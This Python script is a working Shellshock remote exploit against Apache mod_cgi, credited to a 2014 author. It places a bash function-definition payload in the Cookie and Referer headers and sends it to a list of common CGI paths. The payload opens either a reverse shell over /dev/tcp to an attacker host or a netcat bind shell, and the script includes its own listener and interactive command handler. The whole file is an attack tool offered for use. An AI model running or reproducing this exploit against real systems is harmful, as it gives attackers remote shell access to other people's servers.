#! /usr/bin/env python
import _thread
import http.client
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from socket import *
from threading import Thread

stop = False
proxyhost = ""
proxyport = 0

def usage():
	print("""

		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
""")
	sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
	headers = {"Cookie": payload, "Referer": payload}
	
	for page in pages:
		if stop:
			return
		print("[-] Trying exploit on : "+page)
		if proxyhost != "":
			c = http.client.HTTPConnection(proxyhost,proxyport)
			c.request("GET","http://"+rhost+page,headers=headers)
			res = c.getresponse()
		else:
			c = http.client.HTTPConnection(rhost)
			c.request("GET",page,headers=headers)
			res = c.getresponse()
		if res.status == 404:
			print("[*] 404 on : "+page)
		time.sleep(1)
		

args = {}
	
for arg in sys.argv[1:]:
	ar = arg.split("=")
	args[ar[0]] = ar[1]
try:
	args['payload']
except:
	usage()
	
if args['payload'] == 'reverse':
	try:
		lhost = args['lhost']
		lport = int(args['lport'])
		rhost = args['rhost']
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
	except:
		usage()
elif args['payload'] == 'bind':
	try:
		rhost = args['rhost']
		rport = args['rport']
		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	except:
		usage()
else:
	print("[*] Unsupported payload")
	usage()
	
try:
	pages = args['pages'].split(",")
except:
	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]

try:
	proxyhost,proxyport = args['proxy'].split(":")
except:
	pass
			
if args['payload'] == 'reverse':
	serversocket = socket(AF_INET, SOCK_STREAM)
	buff = 1024
	addr = (lhost, lport)
	serversocket.bind(addr)
	serversocket.listen(10)
	print("[!] Started reverse shell handler") 
	_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
if args['payload'] == 'bind':
	serversocket = socket(AF_INET, SOCK_STREAM)
	addr = (rhost,int(rport))
	_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
	
buff = 1024
	
while True:
	if args['payload'] == 'reverse':
		clientsocket, clientaddr = serversocket.accept()
		print("[!] Successfully exploited")
		print("[!] Incoming connection from "+clientaddr[0])
		stop = True
		clientsocket.settimeout(3)
		while True:
			reply = input(clientaddr[0]+"> ")
			clientsocket.sendall(reply.encode()+b"\n")
			try:
				data = clientsocket.recv(buff)
				print(data.decode())
			except:
				pass
		
	if args['payload'] == 'bind':
		try:
			serversocket = socket(AF_INET, SOCK_STREAM)
			time.sleep(1)
			serversocket.connect(addr)
			print("[!] Successfully exploited")
			print("[!] Connected to "+rhost)
			stop = True
			serversocket.settimeout(3)
			while True:
				reply = input(rhost+"> ")
				serversocket.sendall(reply+"\n")
				data = serversocket.recv(buff)
				print(data)
		except:
			pass